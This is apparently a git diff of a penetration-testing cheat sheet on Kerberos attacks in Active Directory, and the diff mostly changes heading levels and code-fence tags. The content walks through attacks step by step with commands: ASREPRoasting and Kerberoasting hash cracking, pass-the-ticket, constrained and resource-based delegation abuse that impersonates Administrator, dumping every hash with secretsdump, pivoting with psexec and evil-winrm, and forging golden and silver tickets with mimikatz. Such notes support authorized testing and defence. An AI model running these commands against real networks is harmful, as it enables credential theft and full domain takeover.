@@ -1,18 +1,12 @@
----
-title: "Kerberos Attacks"
-stage: "5 - Lateral Movement"
-tags: [kerberos, ticket-impersonation, constrained-delegation, golden-ticket, silver-ticket]
----
-
-# Kerberos Attacks
+## Kerberos Attacks
 
 Most "instant DA" stories in AD pentest reports trace back to Kerberos abuse. The protocol is heavy on assumptions — abuse those assumptions and you forge tickets, impersonate users, or pass DCs back and forth like keys.
 
 ---
 
-## Quick Reminder of the Ticket Flow
+### Quick Reminder of the Ticket Flow
 
-```text
+```bash
 Client --AS-REQ-->     KDC
 Client <--TGT (AS-REP) KDC
 Client --TGS-REQ-->    KDC          (presents TGT, names SPN)
@@ -29,7 +23,7 @@ klist                                # show what tickets you hold
 
 ---
 
-## ASREPRoasting
+### ASREPRoasting
 
 Target users with `DOES_NOT_REQUIRE_PREAUTH`. The KDC will hand out an AS-REP encrypted with the user's hash — crack offline.
 
@@ -38,7 +32,7 @@ impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC_IP> | grep -i "use
 hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-## Kerberoasting
+### Kerberoasting
 
 Any authenticated domain user can request a TGS for any SPN. The TGS is encrypted with the *service account's* hash → crack offline.
 
@@ -49,39 +43,39 @@ hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt
 
 Prioritize accounts with weak passwords (look at `pwdLastSet`, `description`, group membership).
 
-## Pass-the-Ticket (PtT)
+### Pass-the-Ticket (PtT)
 
 If you've captured a `.ccache` (export from a Linux shell) or a `.kirbi` (Windows / mimikatz), use it directly:
 
 ```bash
-# Linux
+## Linux
 export KRB5CCNAME=admin.ccache
 impacket-secretsdump -no-pass -k <DC-FQDN>
 ```
 
-```text
-# Mimikatz on Windows
+```bash
+## Mimikatz on Windows
 kerberos::ptt admin.kirbi
 ```
 
-## Constrained Delegation Abuse (S4U)
+### Constrained Delegation Abuse (S4U)
 
 If an account has *Kerberos constrained delegation* (KCD) rights to a target SPN, you can use **S4U2Self + S4U2Proxy** to impersonate any user to that target service.
 
-### 1. Discover delegation rights
+#### 1. Discover delegation rights
 
 ```bash
 impacket-findDelegation <domain>/<user>:'<pass>' -dc-ip <dc-ip>
 ```
 
-### 2. Request a TGT for the low-priv account
+#### 2. Request a TGT for the low-priv account
 
 ```bash
 impacket-getTGT <domain>/<user>:'<pass>' -dc-ip <dc-ip>
 export KRB5CCNAME=<user>.ccache
 ```
 
-### 3. Request a Service Ticket impersonating Administrator
+#### 3. Request a Service Ticket impersonating Administrator
 
 ```bash
 impacket-getST -k -spn <high-acct>/DC.<domain> -impersonate Administrator \
@@ -89,20 +83,20 @@ impacket-getST -k -spn <high-acct>/DC.<domain> -impersonate Administrator \
 export KRB5CCNAME=Administrator.ccache
 ```
 
-### 4. Use the ticket — dump every hash
+#### 4. Use the ticket — dump every hash
 
 ```bash
 impacket-secretsdump -no-pass -k DC.<domain>
 ```
 
-### 5. Pivot with the dumped hash
+#### 5. Pivot with the dumped hash
 
 ```bash
 impacket-psexec <domain>/<acct>@<ip> -hashes :<NTLM>
 evil-winrm -i <ip> -u <acct> -H <NTLM>
 ```
 
-## Unconstrained Delegation
+### Unconstrained Delegation
 
 Less common today, but devastating. A server with unconstrained delegation that you can RCE on will have inbound TGTs for *every* user that auths to it cached in LSASS — including DAs if you can coerce them. Workflow:
 
@@ -111,33 +105,33 @@ Less common today, but devastating. A server with unconstrained delegation that 
 3. Extract the DC's TGT from LSASS (mimikatz `sekurlsa::tickets /export`).
 4. Pass-the-ticket → DCSync.
 
-## Resource-Based Constrained Delegation (RBCD)
+### Resource-Based Constrained Delegation (RBCD)
 
 Set the `msDs-AllowedToActOnBehalfOfOtherIdentity` attribute on a target computer (requires `GenericAll` / `WriteProperty`) → use a controlled account to do S4U attacks against it.
 
 ```bash
-# Add an attacker-controlled machine account
+## Add an attacker-controlled machine account
 impacket-addcomputer -computer-name 'PWN$' -computer-pass 'P@ss123' \
     -dc-ip <dc-ip> <domain>/<user>:<pass>
 
-# Set msDS-AllowedToActOnBehalfOfOtherIdentity on the target
+## Set msDS-AllowedToActOnBehalfOfOtherIdentity on the target
 impacket-rbcd -delegate-from 'PWN$' -delegate-to '<TargetComputer$>' \
     -dc-ip <dc-ip> -action write <domain>/<user>:<pass>
 
-# Request a ticket as Administrator against the target's CIFS service
+## Request a ticket as Administrator against the target's CIFS service
 impacket-getST -spn cifs/<targetfqdn> -impersonate Administrator \
     <domain>/'PWN$':'P@ss123'
 
-# Use it
+## Use it
 export KRB5CCNAME=Administrator.ccache
 impacket-psexec -k -no-pass <domain>/Administrator@<targetfqdn>
 ```
 
-## Golden Ticket
+### Golden Ticket
 
 Forge a TGT using the `krbtgt` hash → "I am Administrator, signed by me."
 
-```text
+```bash
 lsadump::lsa /inject /name:krbtgt
 kerberos::golden /user:Administrator /domain:<dom>.local /sid:<SID> /krbtgt:<NTLM> /id:500
 misc::cmd
@@ -145,23 +139,16 @@ misc::cmd
 
 A golden ticket is valid for 10 years by default; only rotating `krbtgt` *twice* invalidates it.
 
-## Silver Ticket
+### Silver Ticket
 
 Forge a Service Ticket for one specific service using that service's hash. Stealthier — no KDC traffic.
 
-```text
+```bash
 kerberos::golden /user:Administrator /domain:<dom>.local /sid:<SID> \
     /target:<svc-host> /service:<svc> /rc4:<svc-acct-NTLM> /id:500 /ptt
 ```
 
-## Reference
+### Reference
 
 - Harmj0y's AD ACL cheatsheet: <https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993>
 - Impacket toolkit: <https://github.com/fortra/impacket>
-
----
-
-## See Also
-- [Active Directory Enumeration](../1-information-gathering/06-active-directory-enumeration.rmd) — surface the targets first.
-- [Credential Dumping](../4-post-exploitation/03-credential-dumping.rmd) — for the krbtgt / NTLM hashes that feed forging.
-- [ACL Abuse with bloodyAD](./04-acl-abuse-bloodyad.rmd) — RBCD setup uses similar primitives.
